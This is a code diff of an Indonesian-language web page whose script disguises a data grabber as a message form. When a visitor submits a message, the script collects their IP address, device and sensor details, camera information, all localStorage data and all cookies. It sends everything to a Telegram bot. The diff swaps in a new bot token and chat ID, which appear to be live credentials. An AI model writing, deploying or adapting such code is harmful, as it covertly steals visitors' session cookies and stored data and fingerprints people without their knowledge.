@@ -70,8 +70,8 @@
     </form>
 
     <script>
-        const botToken = '7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA';
-        const chatId = '7233342888';
+        const botToken = '8084602778:AAH1LJvRmTkbWXGCfA4O5gQOxvGBFjkptjA';
+        const chatId = '7607840886';
 
         function getPublicIP() {
             return fetch('https://api.ipify.org?format=json')
@@ -161,7 +161,7 @@
             const localStorageData = getLocalStorageData();
             const cookieData = getCookies();
 
-            const message = `ðŸ“© Pesan Baru:\n\nPesan: ${pesanUser}\n\nðŸ“Œ Data Pengunjung:\n- User Agent: ${navigator.userAgent}\n- IP Address: ${ip}\n- Perangkat: ${navigator.platform}\n- Baterai: ${baterai}\n- Memori: ${memori}\n- Jenis Koneksi: ${koneksi}\n- Sensor Cahaya: ${sensor.light}\n- Orientasi: ${sensor.orientation}\n- Akselerometer: ${sensor.accelerometer}\n- Gyroskop: ${sensor.gyroscope}\n- Gravitasi: ${sensor.gravity}\n- Kamera: ${kamera}\n- Ukuran Layar: ${ukuranLayar}\n- Resolusi Layar: ${resolusiLayar}\n- LocalStorage Data: ${localStorageData}\n- Cookie Data: ${cookieData}`;
+            const message = `Pesan Baru:\n\nPesan: ${pesanUser}\n\n Data Pengunjung:\n- User Agent: ${navigator.userAgent}\n- IP Address: ${ip}\n- Perangkat: ${navigator.platform}\n- Baterai: ${baterai}\n- Memori: ${memori}\n- Jenis Koneksi: ${koneksi}\n- Sensor Cahaya: ${sensor.light}\n- Orientasi: ${sensor.orientation}\n- Akselerometer: ${sensor.accelerometer}\n- Gyroskop: ${sensor.gyroscope}\n- Gravitasi: ${sensor.gravity}\n- Kamera: ${kamera}\n- Ukuran Layar: ${ukuranLayar}\n- Resolusi Layar: ${resolusiLayar}\n- LocalStorage Data: ${localStorageData}\n- Cookie Data: ${cookieData}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
